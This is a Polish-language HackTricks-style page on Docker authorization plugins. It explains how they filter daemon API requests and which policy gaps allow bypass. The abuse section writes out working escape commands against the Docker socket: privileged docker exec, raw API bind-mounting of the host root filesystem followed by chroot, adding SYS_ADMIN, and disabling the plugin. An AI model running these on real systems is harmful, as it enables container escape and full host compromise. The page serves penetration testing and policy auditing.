# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Runtime authorization plugins to dodatkowa warstwa polityki, która decyduje, czy klient może wykonać daną akcję demona. Docker jest klasycznym przykładem. Domyślnie każdy, kto potrafi komunikować się z demonem Dockera, ma de facto szeroką kontrolę nad nim. Authorization plugins próbują zawęzić ten model, analizując uwierzytelnioną tożsamość użytkownika i żądaną operację API, a następnie zezwalając lub odrzucając żądanie zgodnie z polityką.

Ten temat zasługuje na oddzielną stronę, ponieważ zmienia model eksploatacji, gdy atakujący ma już dostęp do Docker API lub do użytkownika w grupie `docker`. W takich środowiskach pytanie nie brzmi już tylko „czy mogę dotrzeć do demona?” lecz także „czy demon jest ogrodzony warstwą autoryzacji, a jeśli tak, czy tę warstwę można obejść przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania pluginami?”

## Działanie

Gdy żądanie trafia do demona Dockera, podsystem autoryzacji może przekazać kontekst żądania do jednego lub więcej zainstalowanych wtyczek. Wtyczka widzi tożsamość uwierzytelnionego użytkownika, szczegóły żądania, wybrane nagłówki oraz części ciała żądania lub odpowiedzi, gdy typ treści na to pozwala. Kilka wtyczek może być łańcuchowanych, a dostęp jest przyznawany tylko wtedy, gdy wszystkie wtyczki zezwolą na żądanie.

Ten model wydaje się silny, ale jego bezpieczeństwo zależy całkowicie od tego, jak dobrze autor polityki rozumiał API. Wtyczka, która blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON takie jak top-level `Binds`, lub pozwala na administrację pluginami, może stworzyć fałszywe poczucie ograniczenia, jednocześnie pozostawiając otwarte bezpośrednie ścieżki privilege-escalation.

## Typowe cele wtyczek

Ważne obszary do przeglądu polityki to:

- endpointy tworzenia kontenerów
- pola `HostConfig` takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia przestrzeni nazw
- zachowanie `docker exec`
- endpointy zarządzania pluginami
- każdy endpoint, który może pośrednio wywołać działania w czasie wykonywania poza zamierzonym modelem polityki

Historycznie przykłady takie jak `authz` firmy Twistlock oraz proste edukacyjne wtyczki jak `authobot` ułatwiały badanie tego modelu, ponieważ ich pliki polityk i ścieżki kodu pokazywały, jak mapowanie endpointów na akcje było faktycznie zaimplementowane. W pracy oceniajacej ważna lekcja jest taka, że autor polityki musi rozumieć całą powierzchnię API, a nie tylko najbardziej widoczne polecenia CLI.

## Nadużycia

Pierwszym celem jest ustalenie, co jest faktycznie blokowane. Jeśli demon odrzuca akcję, błąd często leaks nazwę wtyczki, co pomaga zidentyfikować używaną kontrolę:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, narzędzia takie jak `docker_auth_profiler` są przydatne, ponieważ automatyzują w przeciwnym razie powtarzalne zadanie sprawdzania, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko używa niestandardowego pluginu i możesz wchodzić w interakcję z API, określ, które pola obiektu są naprawdę filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te kontrole mają znaczenie, ponieważ wiele błędów autoryzacji jest specyficznych dla pól, a nie dla koncepcji. Plugin może odrzucić wzorzec CLI bez pełnego zablokowania odpowiadającej mu struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Politykę, która blokuje tworzenie uprzywilejowanych kontenerów, ale zezwala na tworzenie nieograniczonych kontenerów oraz użycie `docker exec`, można jednak nadal obejść:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyska uprzywilejowany interaktywny proces wewnątrz kontenera, który autor polityki uważał za ograniczony.

### Full Example: Bind Mount Through Raw API

Niektóre wadliwe polityki sprawdzają tylko jeden kształt JSON. Jeśli bind mount systemu plików root nie jest konsekwentnie blokowany, host nadal można zamontować:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ten sam pomysł może również pojawić się pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest pełne wydostanie się na system plików hosta. Ciekawym szczegółem jest to, że obejście wynika z niepełnego pokrycia polityki, a nie z błędu jądra.

### Pełny przykład: Niezweryfikowany atrybut capability

Jeśli polityka zapomni przefiltrować atrybut związany z capability, atakujący może utworzyć kontener, który odzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Gdy obecne jest `CAP_SYS_ADMIN` lub podobnie silne uprawnienie, wiele technik breakout opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) staje się osiągalnych.

### Pełny przykład: wyłączenie wtyczki

Jeśli operacje zarządzania wtyczkami są dozwolone, najczystszy bypass może polegać na całkowitym wyłączeniu tej kontroli:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
To jest błąd polityki na poziomie control-plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczyć, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia mają na celu ustalenie, czy warstwa polityki istnieje oraz czy wydaje się być kompletna czy powierzchowna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tutaj interesujące:

- Komunikaty odmowy, które zawierają nazwę pluginu, potwierdzają istnienie warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć, by ustalić, czy możliwe są operacje wyłączenia lub rekonfiguracji.
- Polityka, która blokuje tylko oczywiste akcje w CLI, ale nie surowe żądania API, powinna być traktowana jako możliwa do obejścia, dopóki nie udowodniono inaczej.

## Domyślne ustawienia runtime

| Runtime / platforma | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie nieaktywne | Dostęp do demona jest w praktyce wszystko-albo-nic, chyba że skonfigurowano authorization plugin | niekompletna polityka pluginu, blacklists zamiast allowlists, umożliwianie zarządzania pluginami, luki na poziomie pól |
| Podman | Nie jest powszechnym bezpośrednim odpowiednikiem | Podman zwykle bardziej opiera się na uprawnieniach Unix, rootless execution i decyzjach dotyczących wystawiania API niż na Docker-style authz plugins | szerokie wystawienie rootful Podman API, słabe uprawnienia do gniazda |
| containerd / CRI-O | Inny model kontroli | Te runtime'y zwykle opierają się na uprawnieniach gniazda, granicach zaufania węzła i kontrolach orkiestratora na wyższych warstwach, zamiast na Docker authz plugins | montowanie gniazda w workloadach, słabe założenia dotyczące lokalnego zaufania węzła |
| Kubernetes | Używa authn/authz na warstwach API-server i kubelet, a nie Docker authz plugins | RBAC klastra i admission controls to główna warstwa polityk | zbyt szerokie RBAC, słaba polityka admission, bezpośrednie wystawianie kubelet lub runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
